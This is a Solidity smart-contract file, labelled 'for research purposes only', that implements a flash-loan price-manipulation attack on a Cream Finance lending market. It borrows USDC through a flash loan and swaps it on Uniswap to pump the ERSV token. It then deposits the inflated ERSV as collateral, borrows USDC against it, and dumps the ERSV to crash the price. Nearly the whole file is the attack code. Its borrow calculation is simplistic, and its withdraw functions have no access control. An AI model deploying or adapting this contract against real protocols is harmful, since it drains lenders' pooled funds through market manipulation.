// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "./EthosReserve.sol";

// Cream Finance interfaces
interface ICreamComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
    function exitMarket(address cToken) external returns (uint);
    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface ICreamCToken {
    function mint(uint mintAmount) external returns (uint);
    function borrow(uint borrowAmount) external returns (uint);
    function redeem(uint redeemTokens) external returns (uint);
    function repayBorrow(uint repayAmount) external returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function borrowBalanceCurrent(address account) external returns (uint);
    function exchangeRateCurrent() external returns (uint);
}

interface ICreamFlashLoan {
    function flashLoan(
        address receiver,
        address asset,
        uint256 amount,
        bytes calldata data
    ) external;
}

// Uniswap V2 interfaces
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

/**
 * @title Cream Finance Flash Loan Attacker
 * @dev Demonstrates price manipulation using Cream Finance flash loans
 * @notice FOR RESEARCH PURPOSES ONLY
 */
contract CreamFlashLoanAttacker {
    using SafeERC20 for IERC20;
    
    // Token addresses (packed for gas optimization)
    address public immutable ethosReserve;
    address public immutable usdc;
    address public immutable weth;
    
    // DEX addresses (packed for gas optimization)
    address public immutable uniswapV2Factory;
    address public immutable uniswapV2Router;
    
    // Cream Finance addresses (packed for gas optimization)
    address public immutable creamComptroller;
    address public immutable creamFlashLoan;
    address public immutable cUSDC;
    address public immutable cERSV;
    
    // Attack state (packed for gas optimization)
    bool public attackInProgress;
    uint256 public attackProfit;
    
    constructor(
        address _ethosReserve,
        address _usdc,
        address _weth,
        address _uniswapV2Factory,
        address _uniswapV2Router,
        address _creamComptroller,
        address _creamFlashLoan,
        address _cUSDC,
        address _cERSV
    ) {
        ethosReserve = _ethosReserve;
        usdc = _usdc;
        weth = _weth;
        uniswapV2Factory = _uniswapV2Factory;
        uniswapV2Router = _uniswapV2Router;
        creamComptroller = _creamComptroller;
        creamFlashLoan = _creamFlashLoan;
        cUSDC = _cUSDC;
        cERSV = _cERSV;
    }
    
    /**
     * @dev Execute flash loan attack using Cream Finance
     * @param flashLoanAmount Amount to borrow via flash loan
     * @param manipulationAmount Amount to use for price manipulation
     */
    function executeAttack(uint256 flashLoanAmount, uint256 manipulationAmount) external {
        require(!attackInProgress, "Attack already in progress");
        attackInProgress = true;
        attackProfit = 0;
        
        // Step 1: Take flash loan from Cream Finance
        bytes memory data = abi.encode(manipulationAmount);
        
        ICreamFlashLoan(creamFlashLoan).flashLoan(
            address(this),
            usdc,
            flashLoanAmount,
            data
        );
        
        attackInProgress = false;
    }
    
    /**
     * @dev Flash loan callback function (required by Cream Finance)
     */
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == creamFlashLoan, "Caller must be flash loan");
        
        uint256 flashLoanAmount = amount;
        uint256 manipulationAmount = abi.decode(params, (uint256));
        
        // Step 2: Manipulate price
        _manipulatePrice(manipulationAmount);
        
        // Step 3: Deposit collateral to Cream
        _depositCollateral();
        
        // Step 4: Borrow against inflated collateral
        _borrowAssets();
        
        // Step 5: Dump tokens to crash price
        _dumpTokens();
        
        // Step 6: Repay flash loan with premium
        uint256 amountToRepay = flashLoanAmount + premium;
        IERC20(usdc).approve(creamFlashLoan, amountToRepay);
        
        return true;
    }
    
    /**
     * @dev Manipulate ERSV price using flash loan funds
     */
    function _manipulatePrice(uint256 amount) internal {
        // Buy ERSV with flash loan funds to pump price
        address[] memory path = new address[](2);
        path[0] = usdc;
        path[1] = ethosReserve;
        
        // Only approve if needed (gas optimization)
        uint256 allowance = IERC20(usdc).allowance(address(this), uniswapV2Router);
        if (allowance < amount) {
            IERC20(usdc).approve(uniswapV2Router, type(uint256).max);
        }
        
        // Swap USDC for ERSV to pump price
        IUniswapV2Router(uniswapV2Router).swapExactTokensForTokens(
            amount,
            0, // Accept any amount of ERSV
            path,
            address(this),
            block.timestamp + 300 // 5 minute deadline
        );
    }
    
    /**
     * @dev Deposit inflated ERSV as collateral to Cream
     */
    function _depositCollateral() internal {
        // Deposit ERSV to Cream as collateral
        uint256 collateralAmount = IERC20(ethosReserve).balanceOf(address(this));
        
        // Only approve if needed (gas optimization)
        uint256 allowance = IERC20(ethosReserve).allowance(address(this), cERSV);
        if (allowance < collateralAmount) {
            IERC20(ethosReserve).approve(cERSV, type(uint256).max);
        }
        
        // Mint cERSV (deposit ERSV as collateral)
        ICreamCToken(cERSV).mint(collateralAmount);
        
        // Enter market
        address[] memory markets = new address[](1);
        markets[0] = cERSV;
        ICreamComptroller(creamComptroller).enterMarkets(markets);
    }
    
    /**
     * @dev Borrow stablecoins against inflated collateral
     */
    function _borrowAssets() internal {
        // Borrow USDC against the inflated ERSV collateral
        uint256 borrowAmount = calculateMaxBorrow();
        
        // Borrow USDC
        ICreamCToken(cUSDC).borrow(borrowAmount);
        
        // Update attack profit
        attackProfit = borrowAmount;
    }
    
    /**
     * @dev Dump ERSV tokens to crash price
     */
    function _dumpTokens() internal {
        // Sell ERSV tokens to crash the price
        uint256 dumpAmount = IERC20(ethosReserve).balanceOf(address(this));
        
        if (dumpAmount > 0) {
            address[] memory path = new address[](2);
            path[0] = ethosReserve;
            path[1] = usdc;
            
            // Only approve if needed (gas optimization)
            uint256 allowance = IERC20(ethosReserve).allowance(address(this), uniswapV2Router);
            if (allowance < dumpAmount) {
                IERC20(ethosReserve).approve(uniswapV2Router, type(uint256).max);
            }
            
            // Swap ERSV for USDC to crash price
            IUniswapV2Router(uniswapV2Router).swapExactTokensForTokens(
                dumpAmount,
                0, // Accept any amount of USDC
                path,
                address(this),
                block.timestamp + 300 // 5 minute deadline
            );
        }
    }
    
    /**
     * @dev Calculate maximum borrow amount based on collateral
     */
    function calculateMaxBorrow() internal view returns (uint256) {
        // This would calculate based on Cream's collateral factor
        uint256 collateralValue = IERC20(ethosReserve).balanceOf(address(this));
        
        // Assume collateral factor of 50% (conservative estimate)
        // Using bit shifting for gas optimization: 50% = 1/2
        return collateralValue >> 1; // Divide by 2 (50%)
    }
    
    /**
     * @dev Emergency function to withdraw stuck tokens
     */
    function emergencyWithdraw(address token) external {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).safeTransfer(msg.sender, balance);
        }
    }
    
    /**
     * @dev Batch emergency withdraw for multiple tokens
     */
    function emergencyWithdrawBatch(address[] calldata tokens) external {
        uint256 length = tokens.length;
        for (uint256 i = 0; i < length;) {
            uint256 balance = IERC20(tokens[i]).balanceOf(address(this));
            if (balance > 0) {
                IERC20(tokens[i]).safeTransfer(msg.sender, balance);
            }
            unchecked { ++i; } // Gas optimization
        }
    }
    
    /**
     * @dev Get attack statistics
     */
    function getAttackStats() external view returns (bool, uint256) {
        return (attackInProgress, attackProfit);
    }
} 